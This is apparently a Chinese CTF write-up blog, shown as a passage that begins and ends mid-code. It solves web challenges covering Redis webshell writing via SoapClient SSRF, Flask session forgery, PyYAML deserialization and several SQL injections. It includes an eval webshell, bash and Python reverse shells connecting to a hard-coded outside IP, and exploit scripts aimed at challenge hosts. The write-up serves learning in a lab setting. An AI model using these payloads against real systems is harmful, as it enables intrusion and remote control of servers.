class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1:6379/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span>=<span class="string">&quot;AUTH 20220311&quot;</span>;</span><br><span class="line"><span class="variable">$poc1</span>=<span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$poc2</span>=<span class="string">&quot;SET x &#x27;&lt;?@eval(\$_POST[1]);?&gt;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$poc3</span>=<span class="string">&quot;CONFIG SET dbfilename shell.php&quot;</span>;</span><br><span class="line"><span class="variable">$poc4</span>=<span class="string">&quot;SAVE&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;uri&#x27;</span> =&gt;</span><br><span class="line"><span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc1</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc2</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc3</span>.<span class="string">&#x27;^^&#x27;</span>.<span class="variable">$poc4</span>.<span class="string">&#x27;^^&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span> = <span class="string">&#x27;SoapClient&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$swpu</span> = <span class="keyword">new</span> <span class="title function_ invoke__">swpu</span>();</span><br><span class="line"><span class="variable">$swpu</span>-&gt;l61q4cheng = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$swpu</span>));</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221027164155928-1687419303719.png" alt="image-20221027164155928"></p><p>反弹shell</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(%<span class="number">22</span>bash%<span class="number">20</span>-c%<span class="number">20</span><span class="string">&#x27;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F120.77.73.212%2F2333%200%3E%261&#x27;</span>%<span class="number">22</span>)%<span class="number">3</span>B</span><br></pre></td></tr></table></figure><p>SUID提权</p><p><img src="/../images/image-20221027165218664-1687419303719.png" alt="image-20221027165218664"></p><h2 id="BlogSystem–复现"><a href="#BlogSystem–复现" class="headerlink" title="BlogSystem–复现"></a>BlogSystem–复现</h2><p>信息收集，在文章中出现了key，尝试构造session</p><p><img src="/../images/image-20221104151224136-1687419303719.png" alt="image-20221104151224136"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PS E:\scripts\web\flask&gt; python flask-session.py encode -s <span class="string">&#x27;7his_1s_my_fav0rite_ke7&#x27;</span> -t <span class="string">&quot;&#123;&#x27;_permanent&#x27;: True, &#x27;username&#x27;: &#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2S-xQ.V9-DZaiArnzERULY9NHBYf3WL6s</span><br></pre></td></tr></table></figure><p>伪造后身份为admin,多了一个下载功能。</p><p><img src="/../images/image-20221105124636999-1687419303719.png" alt="image-20221105124636999"></p><p>可以猜测后端是使用了<code>os.path.join()</code>来连接path参数。</p><p>这里尝试目录穿越，师傅是尝试并猜测出后端的语句是<code>.replace(&#39;..&#39;, &#39;&#39;).replace(&#39;//&#39;, &#39;&#39;)</code></p><p>其实也可以直接利用<code>os.path.join(path,path1)</code>的漏洞，只要拼接的路径path1是绝对路径，就会忽略掉path。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&#x27;/tmp&#x27;</span>, <span class="string">&#x27;/home/khaz&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/home/khaz&#x27;</span></span><br></pre></td></tr></table></figure><p>读取app.py源码</p><p><img src="/../images/image-20221105130144960-1687419303719.png" alt="image-20221105130144960"></p><p>导入了<strong>config</strong> <strong>model</strong> <strong>view</strong>，典型的MVT结构</p><p><img src="/../images/image-20221105141455843-1687419303719.png" alt="image-20221105141455843"></p><p>尝试访问<code>/app/view.py</code>无果，访问<code>/app/view/__init__.py</code>,得到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .index <span class="keyword">import</span> index</span><br><span class="line"><span class="keyword">from</span> .blog <span class="keyword">import</span> blog</span><br></pre></td></tr></table></figure><p>读取源码 index.py blog.py</p><p>关键部分</p><ul><li>waf</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&#x27;apply|process|eval|os|tuple|popen|frozenset|bytes|type|staticmethod|\(|\)&#x27;</span>, <span class="built_in">str</span>(data), re.M | re.I):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><ul><li>文件上传功能点</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/imgUpload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span><span class="comment"># 还记得app.py注册了蓝图，所以路由为/blog/imgUpload</span></span><br><span class="line"><span class="meta">@login_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imgUpload</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file = request.files.get(<span class="string">&#x27;editormd-image-file&#x27;</span>)</span><br><span class="line">        fileName = file.filename.replace(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        filePath = os.path.join(<span class="string">&quot;static/upload/&quot;</span>, fileName)</span><br><span class="line">        file.save(filePath)</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;上传成功!&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span>: <span class="string">&quot;/&quot;</span> + filePath</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;上传失败&#x27;</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><ul><li>读取文件功能点</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blog.route(<span class="params"><span class="string">&#x27;/saying&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@admin_limit</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Saying</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;path&#x27;</span>):</span><br><span class="line">        file = request.args.get(<span class="string">&#x27;path&#x27;</span>).replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>).replace(<span class="string">&#x27;..\\&#x27;</span>, <span class="string">&#x27;hack&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f = f.read()</span><br><span class="line">                <span class="keyword">if</span> waf(f):</span><br><span class="line">                    <span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：当你看到这句话时，还没有拿到flag，那就赶紧重开环境吧&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：你说得不对&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=<span class="string">&#x27;鲁迅说：&#x27;</span>+<span class="built_in">str</span>(e))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;view/jojo.yaml&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            sayings = yaml.load(f, Loader=Loader)</span><br><span class="line">            saying = random.choice(sayings)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;sayings.html&#x27;</span>, yaml=saying)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>漏洞点，会用yaml.load函数来加载文件（可控），配合文件上传可以造成yaml反序列化漏洞</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(yaml.load(f, Loader=Loader))</span><br></pre></td></tr></table></figure><p><a href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">yaml反序列化漏洞</a></p><p>根据上面文章，可以知道我们需要上传一个poc.yaml</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">!!python/module:static.upload</span><br></pre></td></tr></table></figure><p>一个<code>__init__.py</code>文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os,pty,socket;s=socket.socket();s.connect((<span class="string">&quot;120.77.73.212&quot;</span>,<span class="number">2333</span>));[os.dup2(s.fileno(),f)<span class="keyword">for</span> f <span class="keyword">in</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)];pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>上传文件脚本</p><p>需要注意的是<code>imgUpload()</code>中<code>file = request.files.get(&#39;editormd-image-file&#39;)</code>以及带上session</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1aef01d5-e675-4e45-9357-2524a3e5c570.node4.buuoj.cn:81/blog/imgUpload&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123; name : (文件名,文件内容，文件MIME)  &#125;  将文件信息填入元组（）中，只有文件内容是必选的。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传本地文件</span></span><br><span class="line"><span class="comment">#files = &#123;&quot;editormd-image-file&quot;: (&quot;__init__.py&quot;, open(&#x27;E:\scripts\poc.py&#x27;, &#x27;rb&#x27;))&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接上传文件内容字符串（注意要用二进制）</span></span><br><span class="line">files = &#123;<span class="string">&quot;editormd-image-file&quot;</span>: (<span class="string">&quot;poc.yaml&quot;</span>, <span class="string">b&#x27;!!python/module:static.upload&#x27;</span>)&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># bp代理</span></span><br><span class="line">pro = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8011&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;direction&#x27;</span>:<span class="string">&#x27;upload&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;session&#x27;</span> : <span class="string">&#x27;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6ImFkbWluIn0.Y2S-xQ.V9-DZaiArnzERULY9NHBYf3WL6s&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,files=files,proxies=pro,cookies=cookie,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221105135517382-1687419303719.png" alt="image-20221105135517382"></p><p>然后服务器监听端口，访问<code>/blog/saying?path=static/upload/poc.yaml</code>即可</p><p><img src="/../images/image-20221105135258653-1687419303719.png" alt="image-20221105135258653"></p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="[强网杯2019]随便注"></a>[强网杯2019]随便注</h2><p>告诉我们注入点了</p><p>参数类型，由语法错误可知是单引号闭合</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>经过测试是堆叠注入，所以其后端sql查询使用的是mysqli_multi_query() </p><p>并且有过滤</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure><p>通过show tables知道表名，所以可以使用handle来绕过select，得到表中的信息。</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>只有一个登陆界面，无注册界面，目录扫描无结果。</p><p>测试为单引号闭合。</p><p>在登录后的search.php源代码中找到注释，经过解码得到<code>select * from user where username = &#39;$name&#39;</code></p><p>猜测登陆上去即可获得flag</p><p>通过联合查询构造临时用户</p><p>username&#x3D;<code>1&#39; union select 1,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#</code></p><p>passwd&#x3D;<code>1</code></p><blockquote><p>需要注意的是前面不能为admin’，不然它就会去比较原来admin所对应的密码</p></blockquote><p>成功登录获得flag。</p><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>join注册后，点击username，发现url参数<code>view.php?no=1</code>，可能存在sql注入</p><p>进行测试，<code>1^0</code>页面报错，所以存在sql注入</p><p>判断参数类型，发现为整型</p><p>进行fuzz，发现<code>union select</code>被过滤</p><p><img src="/../images/image-20220728125208126-1687489655110.png" alt="image-20220728125208126"></p><p>尝试构造<code>union/**/select</code>绕过</p><p><img src="/../images/image-20220728125647157-1687489655112.png" alt="image-20220728125647157"></p><p>发现可以绕过，且字段数不为3</p><p><img src="/../images/image-20220728125537515-1687489655113.png" alt="image-20220728125537515"></p><p>发现反序列化函数，字段数为4，可利用的字段在2位置</p><blockquote><p>到这里sql注入就有两个思路，一是联合注入(页面有回显点)，二是报错注入（页面有报错日志，这里过滤了0x7e）。</p></blockquote><p>接下来按照正常思路做即可。</p><p>最后查字段值时会发现users表的第四列data中存放的是经过序列化后的用户的信息</p><p><img src="/../images/image-20220728172644784-1687489655113.png" alt="image-20220728172644784"></p><p>关于反序列化，就一定要有源码。</p><p>进行目录扫描得到user.php.bak，以及flag.php的存在</p><p>主要关注</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="comment">#用curl对博客地址发起请求，并获取内容</span></span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>构造序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">#利用file协议请求本地文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?no=-<span class="number">1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><blockquote><p>这里把其放在第四列，是因为博客信息是存储在users表的第四列data中的</p><p>能够成功的原因是union&#x2F;**&#x2F;select不加表名的特性，会在前面的select表中构造临时数据。</p></blockquote><p>最后在源代码blog content部分可以得到flag.php的内容。</p><p><img src="/../images/image-20220728173710364-1687489655113.png" alt="image-20220728173710364"></p><h2 id="网鼎杯2018-Unfinish"><a href="#网鼎杯2018-Unfinish" class="headerlink" title="[网鼎杯2018]Unfinish"></a>[网鼎杯2018]Unfinish</h2><p>原理</p><blockquote><p>在mysql中+只能当作算术运算符，与php中的+类似 ，可以进行数字字符串+数字的计算</p></blockquote><p><img src="/../images/image-20220717191455431-1687489655114.png" alt="image-20220717191455431"></p><p>前置条件</p><blockquote><p>查询的结果只有一列</p></blockquote><p><img src="/../images/image-20220718093833432-1687489655113.png" alt="image-20220718093833432"></p><p>进去是一个登录界面，一般先找注册界面，登录后再找注入点。</p><p>直接访问url&#x2F;register.php</p><p>需要填三个信息：邮箱，用户名，密码</p><p>登录后，观察到页面只有一个可疑之处,显示了用户名</p><p><img src="/../images/image-20220717182811431-1687489655115.png" alt="image-20220717182811431"></p><p>所以，注入点应该是在用户名处，为回显注入。</p><blockquote><p>这里可以猜测显示用户名的后端语句为<code>select username from table where email=$email</code></p></blockquote><hr><p>回到注册界面继续测试，验证想法。</p><p>注册用户名1”注册成功，用户名为1’时注册失败</p><p><img src="/../images/image-20220717184809571-1687489655115.png" alt="image-20220717184809571"></p><blockquote><p>猜测注册的sql语句为<code>insert into table  value(&#39;$email&#39;,&#39;$username&#39;,&#39;$passwd&#39;) </code>单引号闭合</p></blockquote><p>还有一个点就是，邮箱是唯一的，如果用相同的邮箱注册多个账号只有第一个账号是可以登陆上去的。</p><p>进行fuzz</p><p><img src="/../images/image-20220717185630970-1687489655114.png" alt="image-20220717185630970"></p><p>发现红框内的被过滤</p><p>因为语句为<code>insert into table  value(&#39;$email&#39;,&#39;$username&#39;,&#39;$passwd&#39;) </code></p><p>只能使用运算盲注（其他的构造不了）</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_url = <span class="string">&#x27;http://645cbdc0-53d4-4a12-8d7c-653400adc1dd.node4.buuoj.cn:81/register.php&#x27;</span></span><br><span class="line">login_url = <span class="string">&#x27;http://645cbdc0-53d4-4a12-8d7c-653400adc1dd.node4.buuoj.cn:81/login.php&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    register_data = &#123;</span><br><span class="line">        <span class="comment">#邮箱是唯一的，如果用相同的邮箱注册多个账号只有第一个账号是可以登陆上去的。所以每次注册邮箱都要不同</span></span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;0&#x27; + ascii(substr((select * from flag) from &#123;&#125; for 1)) + &#x27;0&quot;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(url=register_url, data=register_data)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;111@123.com&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(i),</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res_ = requests.post(url=login_url, data=login_data)</span><br><span class="line">    code = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, res_.text)</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">int</span>(code.group(<span class="number">1</span>)))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> ip <span class="keyword">from</span> ip_table</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(isset($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] <span class="operator">=</span> $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip <span class="operator">=</span> $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$last_ip <span class="operator">=</span> &quot;&quot;;</span><br><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> query(&quot;select current_ip, last_ip from ip_log where uuid = &#x27;&quot;.addslashes($uuid).&quot;&#x27;&quot;);</span><br><span class="line">if(<span class="built_in">count</span>($<span class="keyword">result</span>) <span class="operator">&gt;</span> <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    if($ip <span class="operator">!=</span><span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;current_ip&#x27;</span>]) &#123;</span><br><span class="line">        $last_ip <span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;current_ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        query(&quot;delete from ip_log where uuid=&#x27;&quot;.addslashes($uuid).&quot;&#x27;&quot;);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        $last_ip <span class="operator">=</span> $<span class="keyword">result</span>[<span class="number">0</span>][<span class="string">&#x27;last_ip&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query(&quot;insert into ip_log values (&#x27;&quot;.addslashes($uuid).&quot;&#x27;, &#x27;&quot;.addslashes($ip).&quot;&#x27;, &#x27;$last_ip&#x27;);&quot;);</span><br></pre></td></tr></table></figure><p>第一次表中无数据，if(count($result) &gt; 0)不成立，$ip&#x3D;x-forwarded-for1  $last_ip&#x3D;空,插入ip_log表中</p><p>第二次 表中有数据，if(count($result) &gt; 0) 成立，$ip&#x3D;x-forwarded-for2    $last_ip&#x3D;x-forwarded-for1 ,删除第一次插入的数据，插入第二次数据。</p><p>第三次表中有数据, 查询时会用到x-forwarded-for1，这里就是利用点</p><blockquote><p>不看源码，推不出来</p><p>下次如果猜是二次注入，可以多试几次，像这个就是第三次执行</p></blockquote><p>单引号闭合</p><p>第一次输入<code>1&#39; or &#39;1</code></p><p>第二次输入1</p><p>第三次输入1</p><p><img src="/../images/image-20220812122454399-1687489655115.png" alt="image-20220812122454399"></p><p>可以看到第一次的输入执行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.buuoj.cn:26803/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table</span>():</span><br><span class="line">    table = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#控制长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right =<span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> left&lt;right:</span><br><span class="line">            mid = (left+right)//<span class="number">2</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span></span><br><span class="line">            <span class="comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or 